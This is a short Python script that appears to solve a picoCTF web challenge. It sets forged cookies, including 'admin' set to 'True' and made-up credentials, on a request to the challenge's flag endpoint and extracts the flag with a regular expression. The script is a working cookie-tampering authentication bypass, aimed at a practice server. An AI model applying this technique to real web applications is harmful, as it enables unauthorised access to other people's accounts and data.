#!/usr/bin/env python

import requests
import re

r = requests.get('https://jupiter.challenges.picoctf.org/problem/13594/flag', cookies={
    'admin': 'True',
    'password': 'joemama',
    'username': 'joemama',
})

res = re.search('picoCTF{.*}', r.text).group(0)

print(res)
